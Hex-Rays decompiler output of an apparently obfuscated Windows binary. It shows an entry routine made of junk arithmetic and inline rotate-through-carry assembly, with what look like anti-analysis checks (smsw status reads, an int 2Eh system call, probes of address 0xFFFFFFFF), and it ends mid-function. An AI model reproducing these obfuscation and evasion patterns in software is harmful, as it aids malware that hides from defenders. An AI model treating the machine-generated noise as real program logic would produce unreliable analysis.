/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __fastcall nullsub_1(_DWORD, _DWORD); // weak
// char __usercall start@<al>(int a1@<eax>, int _EDX@<edx>, int _ECX@<ecx>, int _ESI@<esi>);
// char __usercall sub_40D7A9@<al>(int a1@<eax>, int a2@<edx>, int _ECX@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);


//----- (0040C6E9) --------------------------------------------------------
char __usercall start@<al>(int a1@<eax>, int _EDX@<edx>, int _ECX@<ecx>, int _ESI@<esi>)
{
  char v4; // al
  bool v6; // tt
  int v7; // ebx
  int v8; // ebx
  int v9; // ebx
  int v10; // ebx
  unsigned int v11; // edi
  int v13; // esi
  int v17; // esi
  int v19; // ebx
  int v23; // edi
  unsigned int v24; // edx
  unsigned int v26; // ebx
  int v28; // ebx
  int v30; // ebx
  unsigned int v31; // edi
  int v32; // esi
  unsigned int v34; // ebx
  unsigned int v39; // edi
  int v40; // edi
  unsigned int v44; // edi
  unsigned int v45; // edx
  unsigned int v47; // ebx
  int v51; // esi
  __m64 v54; // mm0
  int v55; // edx
  int v56; // edi
  int v57; // esi
  int v58; // ebx
  int v60; // edi
  unsigned int v63; // edi
  unsigned int v65; // ebx
  int v69; // ecx
  int v71; // edi
  int v73; // edx
  int v74; // esi
  unsigned int v75; // ebx
  int v76; // edi
  int v77; // eax
  int v78; // edi
  int v83; // esi
  int v84; // ebx
  int v85; // edi
  char result; // al
  __int16 v90; // bx
  int v91; // esi
  int v93; // edi
  unsigned int v94; // edi
  int v98; // esi
  int v99; // ebx
  int v101; // edi
  int v102; // edi
  int v103; // eax
  int v105; // eax
  int v107; // esi
  int v108; // ebx
  int v109; // edx
  int v110; // edx
  int v112; // ecx
  int v116; // esi
  int v117; // edi
  unsigned int v120; // edi
  int v123; // eax
  int v124; // edi
  int v126; // ebx
  int v130; // edi
  int v131; // ebx
  bool v134; // cf
  int v135; // edi
  int v136; // ebx
  int v137; // esi
  int v138; // ebx
  int v139; // ebx
  unsigned int v141; // edi
  int v142; // esi
  int v143; // edi
  int v144; // edi
  int v145; // esi
  int v146; // edi
  int v147; // esi
  int v148; // edi
  unsigned int v153; // ebx
  int v154; // ecx
  int v157; // edi
  __int16 v161; // dx
  int v163; // edi
  int v164; // ebx
  int v165; // eax
  int v166; // esi
  int v168; // esi

  _EBX = a1;
  LOBYTE(_EBX) = BYTE1(_EDX);
  __asm { rcr     esi, cl }
  v116 = _ESI - _EBX;
  LOBYTE(_EBX) = BYTE1(_EDX) + 94;
  v117 = _EBX;
  ++v116;
  BYTE1(_EBX) = (BYTE1(_EDX) + 94) | (((unsigned __int8)_EDX ^ 0xD0) << _ECX);
  __asm
  {
    rcl     ebx, cl
    rcr     bl, cl
  }
  v144 = ((unsigned int)(v117 << _ECX) >> _ECX) - v116;
  v145 = v116 << _ECX;
  v146 = v145 + v144;
  HIWORD(_EBX) = HIWORD(_EDX) & HIWORD(v146);
  LOBYTE(_EBX) = BYTE1(_ECX) | (((unsigned __int8)_EDX & (unsigned __int8)v146) << _ECX);
  BYTE1(_EBX) = BYTE1(a1) + ((char)((unsigned __int16)(_EDX & v146) >> 8) >> _ECX) - _EDX;
  __asm { rcr     bl, cl }
  v93 = __ROR4__(v146, _ECX);
  LOBYTE(_EBX) = __ROR1__(((unsigned __int8)_EBX >> _ECX) + 92, _ECX);
  BYTE1(_EBX) = BYTE1(_EDX) & BYTE1(_EBX) | 0x28;
  _EBX = _ECX + _EBX;
  BYTE1(_EBX) = a1 | (BYTE1(_EBX) << _ECX);
  LOWORD(_EBX) = a1 | (_ECX + __CFSHL__(_EBX, _ECX) + (unsigned __int16)(_EBX << _ECX));
  LOBYTE(_EBX) = _EBX - 1 - BYTE1(_ECX);
  BYTE1(_EBX) &= BYTE1(_EDX);
  BYTE1(_EBX) = (unsigned __int8)((unsigned __int16)(a1 + _EBX) >> 8) >> _ECX;
  __asm { rcl     bh, cl }
  LOBYTE(_EBX) = (a1 ^ (BYTE1(_ECX) << _ECX)) - 96;
  __asm { rcl     bl, cl }
  v10 = v93 | (_ECX + __CFADD__((_BYTE)a1, BYTE1(_ECX) + __CFSHL__(_EBX, _ECX) + ((_BYTE)_EBX << _ECX)) + a1);
  BYTE1(v10) = 39;
  LOBYTE(v10) = _ECX + __ROR1__(v10 - 1, _ECX);
  _ESI = (__ROR4__(v145, _ECX) << _ECX) - v93;
  v130 = v10 | v93;
  v131 = v10 >> _ECX;
  __asm { rcr     esi, cl }
  BYTE1(v131) &= 0xA4u;
  v134 = __CFADD__(_ESI, v130);
  v135 = _ESI + v130;
  LOBYTE(v131) = v131 - (v134 + BYTE1(a1));
  v136 = v131 << _ECX;
  LOBYTE(v136) = v136 & 0x89;
  BYTE1(v136) |= _EDX;
  v137 = _EDX + __ROR4__(_ESI, _ECX);
  v138 = __ROL4__(v136, _ECX);
  LOBYTE(v138) = BYTE1(v138);
  v139 = v137 + __CFSHR__(v135, _ECX) + v138;
  _ESI = __ROL4__(v137, _ECX);
  __asm { rcl     esi, cl }
  BYTE1(v139) = a1 | (BYTE1(v139) - (__CFADD__((_BYTE)v139, 38) + BYTE1(_ECX)));
  LOBYTE(v139) = _ECX;
  LODWORD(_RDI) = v139 | __ROR4__(v135, _ECX);
  LODWORD(_RDI) = _RDI + HIDWORD(_RDI) - ((_RDI + (unsigned __int64)HIDWORD(_RDI)) >> 32);
  HIDWORD(_RDI) <<= _ECX;
  _EBX = v139 >> _ECX;
  LODWORD(_RDI) = HIDWORD(_RDI) & a1 & _RDI;
  __asm { rcl     edi, cl }
  LOBYTE(_EBX) = ((unsigned __int8)a1 | (unsigned __int8)((BYTE1(_EBX) + ((unsigned __int8)_EDX ^ (unsigned __int8)_EBX)) << _ECX)) << _ECX;
  __asm { rcr     bl, cl }
  BYTE1(_EBX) = (BYTE1(_EBX) | 0x35) ^ 0x68;
  LODWORD(_RDI) = _ECX ^ _RDI;
  v6 = __CFSHR__(_EBX, _ECX);
  LOBYTE(_EBX) = __ROR1__(_EBX, _ECX);
  v7 = _EDX + v6 + _EBX;
  BYTE1(v7) |= (unsigned __int8)_EDX | 0xB4;
  v8 = v7 >> _ECX;
  LOBYTE(v8) = (char)v8 >> _ECX;
  BYTE1(v8) &= BYTE1(a1);
  v9 = _RDI + v8;
  __asm { rcr     edi, cl }
  LOBYTE(v9) = -42 >> _ECX;
  BYTE1(v9) = (unsigned __int8)(_EDX + __CFSHR__(__ROL4__(_RDI, _ECX), _ECX) + (BYTE1(v9) ^ 0x8E)) >> _ECX;
  v19 = v9 - _EDX;
  BYTE1(v19) = (BYTE1(v19) - BYTE1(a1)) ^ 0x54;
  _EBX = __ROR4__(v19, _ECX);
  LOBYTE(_EBX) = _EBX ^ 0x65;
  __asm { rcl     bl, cl }
  LOBYTE(_EBX) = _EDX ^ _EBX;
  __asm
  {
    rcl     bl, cl
    rcr     ebx, cl
  }
  ++BYTE1(_EBX);
  v30 = _ECX ^ _EBX;
  HIDWORD(_RDI) = v30 & v30 & ((_EDX & HIDWORD(_RDI)) + 1);
  SBYTE1(v30) >>= _ECX;
  SHIDWORD(_RDI) >>= _ECX;
  LODWORD(_RDI) = _EDX >> _ECX << _ECX;
  BYTE1(_EDX) += a1 + __CFSHL__(_EDX >> _ECX, _ECX);
  _CX = _RDI ^ _ECX;
  __asm { rcl     edx, cl }
  BYTE1(v30) >>= _CX;
  _CX = _EDX + _CX;
  LODWORD(_RDI) = __ROL4__(_RDI, _CX);
  LOBYTE(v30) = ((_BYTE)v30 - 84) << _CX;
  BYTE1(v30) &= 0x62u;
  v108 = __ROL4__(v30, _CX);
  LOBYTE(_EDX) = (char)_EDX >> _CX;
  BYTE1(_EDX) &= 0xC5u;
  __asm { rcl     ch, cl }
  HIBYTE(_CX) <<= _CX;
  __asm { rcr     dh, cl }
  BYTE1(_EDX) <<= _CX;
  HIDWORD(_RDI) &= _EDX;
  BYTE1(_EDX) -= v108;
  LOBYTE(_EDX) = BYTE1(_EDX) ^ _EDX;
  LOBYTE(_CX) = v108 | _CX;
  HIDWORD(_RDI) -= _RDI;
  v54 = _mm_cvtsi32_si64(0x9A07u);
  __asm { rcl     esi, cl }
  LOBYTE(_CX) = (_BYTE)_CX << _CX;
  v109 = _RDI & _EDX;
  LOBYTE(v109) = -73;
  v134 = __CFSHL__(v109, _CX);
  v110 = v109 << _CX;
  BYTE1(v110) &= v108;
  LOBYTE(v110) = BYTE1(v108) & v110;
  BYTE1(v108) &= HIBYTE(_CX) - (v134 + v108);
  _EBX = v110 + v108;
  HIDWORD(_RDI) = _EBX & (HIDWORD(_RDI) << _CX);
  LOBYTE(_CX) = BYTE1(v110) | _CX;
  LODWORD(_RDI) = 39175 - HIDWORD(_RDI) - v110;
  __asm { rcl     bh, cl }
  _ECX = _EBX;
  LOBYTE(_ECX) = _EBX;
  __asm { rcl     eax, cl }
  v105 = _mm_cvtsi64_si32(_m_pmullw(v54, v54));
  __asm { rcr     ecx, cl }
  v134 = __CFSHL__(HIDWORD(_RDI), _ECX);
  v107 = HIDWORD(_RDI) << _ECX;
  LOBYTE(v110) = v105 + v134 + (_EBX & v110);
  LODWORD(_RDI) = (int)(_ECX ^ _RDI) >> _ECX;
  LOBYTE(_ECX) = (_BYTE)_ECX << _ECX;
  BYTE1(v110) |= 0x8Eu;
  v69 = _EBX + _ECX;
  BYTE1(_EBX) &= BYTE1(v69);
  v71 = _RDI - v69;
  _ECX = v69 + 1;
  v73 = v110 >> _ECX;
  LOBYTE(_ECX) = _EBX | _ECX;
  v91 = v107 << _ECX;
  if ( v105 == 27697 )
  {
    __asm { fnclex }
    v154 = 0;
    do
    {
      __asm { smsw    eax }
      if ( ++v154 == 2 )
        return nullsub_1(2, v73);
    }
    while ( (_EAX & 8) != 0 );
    do
      __asm { smsw    eax }
    while ( (_EAX & 2) == 0 );
    LOBYTE(v154) = _EBX + __CFADD__(v91, v71) + v154;
    ++BYTE1(v154);
    LOBYTE(_EBX) = (_BYTE)_EBX << v154;
    _ECX = _EAX ^ v154;
    LOBYTE(_ECX) = BYTE1(_ECX) + ((_BYTE)_ECX << _ECX);
    BYTE1(v73) >>= _ECX;
    ++BYTE1(_ECX);
    __asm { rcr     bl, cl }
    LOBYTE(_EBX) = _EBX - _ECX + 89;
    _ECX = _ECX << _ECX;
    LOBYTE(_ECX) = BYTE1(v73) | _ECX;
    v157 = __ROR4__(v91 + v71, _ECX);
    HIWORD(v73) = 0;
    _EBX = v91 & _EBX;
    __asm { rcr     ebx, cl }
    v134 = __CFSHR__(_ECX, _ECX);
    LOBYTE(_ECX) = (char)_ECX >> _ECX;
    LOBYTE(_EBX) = v134 + _EBX;
    v60 = __ROL4__(v157, _ECX);
    BYTE1(_EBX) = BYTE1(_EBX) - 12 + 96;
    LOBYTE(_ECX) = _ECX | 0x55;
    BYTE1(_ECX) = __ROL1__(__ROR1__((BYTE1(_ECX) | 0x1A) - (v73 - 85), _ECX), _ECX) - 39;
    v166 = v91 << _ECX;
    __asm { int     2Eh; DOS 2+ internal - EXECUTE COMMAND }
    _ECX = _ECX + 1;
    _EDI = v60 - _EBX;
    v168 = __ROL4__(v166, _ECX);
    __asm
    {
      rcl     ebx, cl
      rcr     edi, cl
    }
    LOBYTE(_ECX) = _ECX & 0x75;
    v120 = _EBX ^ _EDI;
    BYTE1(_EBX) = __ROL1__(BYTE1(_EBX), _ECX);
    __asm { rcr     ch, cl }
    v134 = __CFADD__((_BYTE)_ECX, -116);
    LOBYTE(_ECX) = _ECX - 116;
    BYTE1(_EBX) += _ECX + v134;
    LOBYTE(_EBX) = -23;
    v123 = MEMORY[0xFFFFFFFF];
    if ( MEMORY[0xFFFFFFFF] == -1073741778 )
    {
      _ECX = _EBX | _ECX;
      BYTE1(_EBX) &= 0x18u;
      LOBYTE(v123) = __ROL1__(46 >> _ECX, _ECX);
      v4 = __ROL4__(v123, _ECX);
      LOWORD(_ECX) = 256;
      __asm { rcl     ecx, cl }
      HIBYTE(v161) = v4;
      LOBYTE(v161) = 1 >> _ECX;
      _ESI = (unsigned int)(v168 - 1) >> _ECX << _ECX;
      LOBYTE(_ECX) = (_BYTE)_ECX << _ECX;
      __asm { rcl     ch, cl }
      v165 = 3;
      v90 = v161 + _EBX - (__CFSHR__(_ECX, _ECX) + (_WORD)v120);
      LOBYTE(_ECX) = __ROR1__(_ECX, _ECX) - HIBYTE(v90);
      HIBYTE(v90) = (HIBYTE(v90) >> _ECX) ^ 0xA8;
      BYTE1(_ECX) = v90 + BYTE1(_ECX) - 1;
      LOWORD(_ECX) = _ECX - 1;
      __asm { rcl     ch, cl }
      v143 = (v120 >> _ECX) - 1;
      BYTE1(_ECX) = SBYTE1(_ECX) >> _ECX >> _ECX;
      v55 = 0;
      __asm { rcr     esi, cl }
      LOBYTE(_ECX) = (unsigned __int16)(v143 + __CFSHL__(_ESI, _ECX) + (_WORD)_ECX) >> 8;
      __asm { rcr     cl, cl }
      LOBYTE(_ECX) = __CFSHL__((HIBYTE(v90) | 0x90) + 46, _ECX) + _ECX;
      __GS__ = 3;
      __asm { rcl     cl, cl }
      v163 = __ROR4__(v143, _ECX);
      HIWORD(v164) = 0;
      BYTE1(v164) = __ROR1__(0, _ECX);
      LOBYTE(v164) = -1;
      while ( 1 )
      {
        _ECX = v164;
        v134 = __CFSHR__(v164, v164);
        v28 = v164 >> v164;
        __asm { rcr     cl, cl }
        BYTE1(v28) = BYTE1(v165);
        LOBYTE(v28) = v28 - (v134 + BYTE1(v55));
        v134 = __CFSHL__(v28, _ECX);
        LOBYTE(v28) = (_BYTE)v28 << _ECX;
        LOBYTE(_ECX) = v28 + v134 + _ECX - 1;
        SBYTE1(_ECX) >>= _ECX;
        v112 = v165 + _ECX;
        v134 = __CFSHL__(BYTE1(v112), v112);
        BYTE1(v112) <<= v112;
        _ECX = v165 + v134 + v112;
        v83 = v163;
        LOBYTE(v28) = (v55 ^ (v28 + 8)) + 85;
        v84 = v55 + v28;
        BYTE1(v84) = __ROR1__(BYTE1(v84), _ECX);
        v85 = (v163 << _ECX) - 1;
        BYTE1(_ECX) = BYTE1(_ECX) ^ 0xFD | 3;
        __asm { rcl     ecx, cl }
        LOBYTE(_ECX) = BYTE1(v55) + _ECX;
        _ECX = v55 + _ECX;
        v98 = __ROL4__(v83, _ECX);
        LOBYTE(_ECX) = _ECX - 102;
        BYTE1(v84) &= v55;
        LOBYTE(v84) = v84 + 99;
        v99 = __ROR4__(v84, _ECX);
        v74 = (v85 + v98) >> _ECX;
        LOBYTE(v99) = (unsigned __int8)v99 >> _ECX;
        BYTE1(_ECX) = (((char)(BYTE1(_ECX) - BYTE1(v55)) >> _ECX) + 1) << _ECX;
        ++v55;
        BYTE1(v99) = _ECX ^ ((unsigned __int8)(SBYTE1(v99) >> _ECX) >> _ECX);
        v56 = v99 & (v85 + 1);
        LOBYTE(_ECX) = _ECX + 1;
        v57 = v74 << _ECX;
        BYTE1(_ECX) = (BYTE1(_ECX) - _ECX) & 0xBF | 0x67;
        v58 = v57 & v99;
        _EDI = v57 & v56;
        LOBYTE(v58) = __ROR1__(v58, _ECX) ^ 0x91;
        __asm { rcl     edi, cl }
        _ECX = _ECX << _ECX;
        BYTE1(v58) -= v58;
        v126 = v57 + v58;
        BYTE1(_ECX) &= 0x3Eu;
        LOBYTE(_ECX) = v126 ^ _ECX;
        __asm { rcr     cl, cl }
        BYTE1(_ECX) |= _ECX;
        _EBX = v55 & v126;
        if ( v55 == 20012372 )
          break;
        v164 = _EDI | _EBX;
        BYTE1(v164) &= 0xFEu;
        LOBYTE(_ECX) = ((_BYTE)_ECX << _ECX) - 83;
        v40 = v164 | _EDI;
        v134 = __CFADD__(_ECX, v40);
        _EDI = _ECX + v40;
        LOBYTE(_ECX) = _ECX - (v134 + BYTE1(_ECX));
        __asm { rcl     edi, cl }
        v163 = __GS__ + __CFSHL__(BYTE1(_ECX), _ECX) + _EDI;
        BYTE1(v164) &= 0x29u;
        v165 = __ROR4__(__GS__, 1);
      }
      _CL = ((unsigned __int16)((__PAIR64__(_ECX, 20012372) - __PAIR64__(__GS__, 20012372)) >> 32) >> 8) | ((__PAIR64__(_ECX, 20012372) - __PAIR64__(__GS__, 20012372)) >> 32);
      result = BYTE1(_EBX) + 2;
      __asm { rcl     bl, cl }
    }
    else
    {
      _EAX = MEMORY[0xFFFFFFFF] << _ECX;
      LOBYTE(v73) = __ROL1__(0, _ECX);
      BYTE1(_EBX) |= _ECX;
      v13 = v168 - 1;
      _EBX = _EBX >> _ECX;
      LOBYTE(_EAX) = ((unsigned __int8)_EAX >> _ECX) - (__CFADD__(v13, v120) + BYTE1(_EBX));
      BYTE1(v73) = (char)_ECX >> _ECX;
      LOBYTE(_ECX) = _ECX - 3;
      LOBYTE(_EBX) = BYTE1(_ECX) + _EBX;
      ++_EAX;
      v44 = v13 + v120 - v73;
      v45 = _ECX + v73;
      BYTE1(_ECX) = _ECX + __CFADD__(BYTE1(_ECX), -122) + BYTE1(_ECX) - 122;
      __asm { rcl     ebx, cl }
      v47 = _EBX >> _ECX;
      __asm { rcl     al, cl }
      _ECX = _ECX + 1;
      BYTE1(_EAX) = 22;
      LOBYTE(v47) = v47 ^ 0x77;
      LOBYTE(v45) = 22;
      ++_EAX;
      BYTE1(_EAX) -= 26;
      v134 = __CFADD__(_ECX, v47);
      v75 = _ECX + v47;
      __asm { rcr     al, cl }
      LOBYTE(_ECX) = -16;
      BYTE1(v45) -= v134 + _EAX;
      v134 = __CFSHR__(v45, -16);
      v45 >>= 16;
      v148 = _EAX & (v13 + v134 + v44);
      LOBYTE(_EAX) = _EAX & 0xD7;
      LOBYTE(v75) = __ROL1__(54, 240);
      _EBX = _EAX + __CFSHL__(54, -16) + v75;
      LOBYTE(v45) = 0;
      __asm { rcl     bh, cl }
      LOBYTE(_EBX) = __ROR1__(_EBX, 240);
      ++_EBX;
      v134 = __CFSHR__(_ECX, -16);
      _ECX >>= 16;
      v141 = _EBX + v134 + v148;
      v142 = _ECX & (v13 << 16);
      LOBYTE(_ECX) = 124;
      LOWORD(_EAX) = 25088;
      BYTE1(v45) = __ROL1__(BYTE1(v45), 124);
      __asm { rcr     ch, cl }
      _EDX = _EAX ^ v45;
      __asm { rcl     dl, cl }
      BYTE1(_EBX) &= _EDX;
      v65 = _EBX - _EDX;
      ++BYTE1(v65);
      v134 = __CFSHR__(_EAX, 124);
      _EAX >>= 28;
      LOBYTE(v65) = v65 - (v134 + _EDX);
      LOWORD(_ECX) = 0;
      v134 = __CFADD__(_EAX, v65);
      _EBX = _EAX + v65;
      LOBYTE(_EBX) = BYTE1(_EBX) + v134 + _EBX;
      ++_EDX;
      __asm { rcr     al, cl }
      _ESI = __ROR4__(v142, 124) - _EAX;
      _ECX = _EBX & _ECX;
      BYTE1(_EBX) = __ROR1__(BYTE1(_EBX), _ECX);
      BYTE1(_ECX) -= _EBX;
      BYTE1(_EDX) |= BYTE1(_EBX);
      v134 = __CFSHR__(BYTE1(_EBX), _ECX);
      BYTE1(_EBX) >>= _ECX;
      LOBYTE(_EAX) = BYTE1(_EBX) + v134 + _EAX;
      __asm { rcl     bh, cl }
      v94 = v141 - _EDX;
      HIWORD(_EBX) = HIWORD(v94);
      BYTE1(_EAX) |= BYTE1(v94);
      _ECX = _ECX << _ECX;
      _EDX = _EDX >> _ECX;
      __asm { rcr     esi, cl }
      LOBYTE(_EBX) = 61;
      --_EAX;
      BYTE1(_EBX) = __ROR1__(BYTE1(v94), _ECX);
      LOBYTE(_EAX) = ((unsigned __int8)_EAX >> _ECX) ^ 9;
      v147 = _EBX & (v94 ^ _ESI);
      LOWORD(_ECX) = _ECX - 1;
      LOBYTE(_EAX) = (_BYTE)_EAX << _ECX;
      LOBYTE(_EBX) = 0x3Du >> _ECX;
      _EAX = (_EDX + __CFSHR__(61, _ECX) + v147) & _EAX;
      LOBYTE(_EAX) = _ECX + _EAX;
      v63 = _EBX;
      BYTE1(_EAX) = BYTE1(_ECX) & 0xBF ^ BYTE1(_EAX) | 0xC9;
      __asm
      {
        rcr     eax, cl
        rcl     bl, cl
      }
      v124 = __ROL4__(v63, _ECX);
      LOBYTE(_ECX) = _ECX - 1;
      BYTE1(_EAX) = (BYTE1(_EAX) & 0xB0) + 1;
      BYTE1(_EDX) = __ROL1__(BYTE1(_EDX), _ECX);
      --_EAX;
      LOBYTE(_EBX) = 35;
      BYTE1(_EAX) = __ROL1__(BYTE1(_EAX) - 1, _ECX);
      v102 = v124 - (__CFSHR__(_EBX, _ECX) + _EAX);
      LOBYTE(_EDX) = __ROL1__(3, _ECX);
      BYTE1(_EAX) = 0;
      v103 = v102 & _EAX;
      LOBYTE(_EBX) = __ROR1__(__ROR4__(_EBX, _ECX), _ECX) - v103;
      LOBYTE(_ECX) = BYTE1(v103) + _ECX;
      BYTE1(v103) = __ROL1__(BYTE1(v103), _ECX);
      LOBYTE(_ECX) = _EBX ^ _ECX;
      LOBYTE(_EDX) = _EDX - 1;
      BYTE1(v103) = (BYTE1(v103) - (_BYTE)_EBX) << _ECX;
      __asm { rcl     edx, cl }
      result = __ROL4__(v103, _ECX);
    }
  }
  else
  {
    _EAX = v105 << _ECX;
    LOBYTE(v73) = __ROL1__(v73, _ECX);
    BYTE1(_EBX) |= _ECX;
    v51 = v91 - 1;
    _EBX = _EBX >> _ECX;
    LOBYTE(_EAX) = ((unsigned __int8)_EAX >> _ECX) - (__CFADD__(v51, v71) + BYTE1(_EBX));
    BYTE1(v73) = (char)_ECX >> _ECX;
    LOBYTE(_ECX) = _ECX - 3;
    LOBYTE(_EBX) = BYTE1(_ECX) + _EBX;
    ++_EAX;
    v23 = v51 + v71 - v73;
    v24 = _ECX + v73;
    BYTE1(_ECX) = _ECX + __CFADD__(BYTE1(_ECX), -122) + BYTE1(_ECX) - 122;
    __asm { rcl     ebx, cl }
    v26 = _EBX >> _ECX;
    __asm { rcl     al, cl }
    _ECX = _ECX + 1;
    BYTE1(_EAX) = 22;
    LOBYTE(v26) = v26 ^ 0x77;
    LOBYTE(v24) = 22;
    ++_EAX;
    BYTE1(_EAX) -= 26;
    v134 = __CFADD__(_ECX, v26);
    v34 = _ECX + v26;
    __asm { rcr     al, cl }
    LOBYTE(_ECX) = -16;
    BYTE1(v24) -= v134 + _EAX;
    v134 = __CFSHR__(v24, -16);
    v24 >>= 16;
    v78 = _EAX & (v51 + v134 + v23);
    LOBYTE(_EAX) = _EAX & 0xD7;
    LOBYTE(v34) = __ROL1__(54, 240);
    _EBX = _EAX + __CFSHL__(54, -16) + v34;
    LOBYTE(v24) = 0;
    __asm { rcl     bh, cl }
    LOBYTE(_EBX) = __ROR1__(_EBX, 240);
    ++_EBX;
    v134 = __CFSHR__(_ECX, -16);
    _ECX >>= 16;
    v31 = _EBX + v134 + v78;
    v32 = _ECX & (v51 << 16);
    LOBYTE(_ECX) = 124;
    LOWORD(_EAX) = 25088;
    BYTE1(v24) = __ROL1__(BYTE1(v24), 124);
    __asm { rcr     ch, cl }
    _EDX = _EAX ^ v24;
    __asm { rcl     dl, cl }
    BYTE1(_EBX) &= _EDX;
    v153 = _EBX - _EDX;
    ++BYTE1(v153);
    v134 = __CFSHR__(_EAX, 124);
    _EAX >>= 28;
    LOBYTE(v153) = v153 - (v134 + _EDX);
    LOWORD(_ECX) = 0;
    v134 = __CFADD__(_EAX, v153);
    _EBX = _EAX + v153;
    LOBYTE(_EBX) = BYTE1(_EBX) + v134 + _EBX;
    ++_EDX;
    __asm { rcr     al, cl }
    _ESI = __ROR4__(v32, 124) - _EAX;
    _ECX = _EBX & _ECX;
    BYTE1(_EBX) = __ROR1__(BYTE1(_EBX), _ECX);
    BYTE1(_ECX) -= _EBX;
    BYTE1(_EDX) |= BYTE1(_EBX);
    v134 = __CFSHR__(BYTE1(_EBX), _ECX);
    BYTE1(_EBX) >>= _ECX;
    LOBYTE(_EAX) = BYTE1(_EBX) + v134 + _EAX;
    __asm { rcl     bh, cl }
    v11 = v31 - _EDX;
    HIWORD(_EBX) = HIWORD(v11);
    BYTE1(_EAX) |= BYTE1(v11);
    _ECX = _ECX << _ECX;
    _EDX = _EDX >> _ECX;
    __asm { rcr     esi, cl }
    LOBYTE(_EBX) = 61;
    --_EAX;
    BYTE1(_EBX) = __ROR1__(BYTE1(v11), _ECX);
    LOBYTE(_EAX) = ((unsigned __int8)_EAX >> _ECX) ^ 9;
    v17 = _EBX & (v11 ^ _ESI);
    LOWORD(_ECX) = _ECX - 1;
    LOBYTE(_EAX) = (_BYTE)_EAX << _ECX;
    LOBYTE(_EBX) = 0x3Du >> _ECX;
    _EAX = (_EDX + __CFSHR__(61, _ECX) + v17) & _EAX;
    LOBYTE(_EAX) = _ECX + _EAX;
    v39 = _EBX;
    BYTE1(_EAX) = BYTE1(_ECX) & 0xBF ^ BYTE1(_EAX) | 0xC9;
    __asm
    {
      rcr     eax, cl
      rcl     bl, cl
    }
    v101 = __ROL4__(v39, _ECX);
    LOBYTE(_ECX) = _ECX - 1;
    BYTE1(_EAX) = (BYTE1(_EAX) & 0xB0) + 1;
    BYTE1(_EDX) = __ROL1__(BYTE1(_EDX), _ECX);
    --_EAX;
    LOBYTE(_EBX) = 35;
    BYTE1(_EAX) = __ROL1__(BYTE1(_EAX) - 1, _ECX);
    v76 = v101 - (__CFSHR__(_EBX, _ECX) + _EAX);
    LOBYTE(_EDX) = __ROL1__(3, _ECX);
    BYTE1(_EAX) = 0;
    v77 = v76 & _EAX;
    LOBYTE(_EBX) = __ROR1__(__ROR4__(_EBX, _ECX), _ECX) - v77;
    LOBYTE(_ECX) = BYTE1(v77) + _ECX;
    BYTE1(v77) = __ROL1__(BYTE1(v77), _ECX);
    LOBYTE(_ECX) = _EBX ^ _ECX;
    LOBYTE(_EDX) = _EDX - 1;
    BYTE1(v77) = (BYTE1(v77) - (_BYTE)_EBX) << _ECX;
    __asm { rcl     edx, cl }
    result = __ROL4__(v77, _ECX);
  }
  return result;
}
// 40C986: control flows out of bounds to 40C988
// 40C3DC: using guessed type int __fastcall nullsub_1(_DWORD, _DWORD);

//----- (0040D7A9) --------------------------------------------------------
char __usercall sub_40D7A9@<al>(int a1@<eax>, int a2@<edx>, int _ECX@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>)
{
  int v7; // edi
  int v9; // edi
  int v10; // ebx
  int v11; // ebx
  int v14; // ebx
  bool v16; // tt
  int v17; // eax
  int v18; // ecx
  int v19; // edx
  int v22; // edi
  __int64 v24; // rax
  int v25; // esi
  int v26; // edx
  int v27; // esi
  unsigned int v29; // edx
  int v30; // esi
  int v31; // edi
  int v32; // ecx
  int v34; // esi
  char v36; // al
  char v37; // dl
  int v38; // edx
  int v40; // edi
  int v43; // eax
  int v44; // edx
  unsigned int v45; // edi
  int v46; // eax
  int v48; // edi
  int v51; // edi
  int v55; // esi
  int v58; // esi
  bool v60; // tt
  int v61; // ecx
  int v62; // ebx
  int v63; // eax
  unsigned int v64; // edx
  int v65; // ebx
  bool v66; // cf
  int v67; // edx
  unsigned int v70; // edi
  unsigned int v73; // esi
  int v74; // ebx
  unsigned int v75; // ebx
  unsigned int v76; // ecx
  unsigned int v77; // esi
  int v78; // edi
  int v81; // ebx
  int v82; // esi
  int v83; // edx
  int v85; // eax
  int v88; // ebx
  int v89; // eax
  int v90; // edi
  int v91; // ebx
  int v94; // esi
  int v98; // ebx
  int v99; // ebx
  int v101; // ebx
  int v102; // ebx
  int v105; // edi
  int v107; // esi
  int v109; // esi
  int v110; // esi
  int v111; // edi
  _BYTE *v112; // edx
  unsigned int v113; // edi
  bool v114; // tt
  unsigned int v115; // esi
  int v116; // esi
  int v117; // esi
  int v118; // edi
  int v119; // edi
  int v122; // esi
  int v123; // esi
  int v124; // edi
  int v126; // edi
  int v128; // edx
  int v129; // edi
  int v130; // ebx
  unsigned int v132; // edx
  int v133; // ebx
  int v134; // ebx
  int v135; // esi
  bool v136; // tt
  int v137; // esi
  int v138; // edi
  unsigned int v139; // eax
  int v148; // edi
  unsigned int v150; // esi
  unsigned int v152; // esi
  unsigned int v153; // ebx
  unsigned int v154; // esi
  int v161; // ecx
  unsigned int v166; // edx
  int v167; // edi
  unsigned int v168; // edx
  int v169; // edi
  int v170; // ecx
  int v172; // edi
  int v174; // edi
  int v175; // eax
  int v180; // edx
  int v182; // ebx
  int v183; // eax
  char v184; // [esp-14h] [ebp-14h]
  char v185; // [esp-13h] [ebp-13h]
  __int16 v186; // [esp-12h] [ebp-12h]
  int v187; // [esp-10h] [ebp-10h]
  int v188; // [esp-10h] [ebp-10h]

  BYTE1(a1) = __ROR1__(BYTE1(a1), _ECX);
  __asm { rcr     cl, cl }
  v43 = a1 + 1;
  v44 = a6 & a2;
  v45 = a5 << _ECX;
  BYTE1(a4) = __ROL1__(BYTE1(a4), _ECX);
  v16 = __CFSHL__(BYTE1(v43), _ECX);
  BYTE1(v43) = __ROL1__(BYTE1(v43), _ECX);
  --BYTE1(_ECX);
  v17 = _ECX + v16 + v43;
  LOBYTE(a4) = ((_BYTE)a4 - 1) << _ECX;
  v18 = (_ECX >> _ECX) - a4;
  BYTE1(a4) <<= v18;
  LOBYTE(v44) = (unsigned __int8)v17 >> v18;
  BYTE1(v44) = BYTE1(v44) - 24 - (a4 << v18);
  v61 = v18 << v18;
  LOBYTE(v44) = v44 ^ 0xBC;
  LOBYTE(v17) = v17 - (__CFSHL__(a6, v61) + v44);
  LOBYTE(v44) = (unsigned __int8)v44 >> v61;
  ++v44;
  v136 = __CFSHL__(BYTE1(v17), v61);
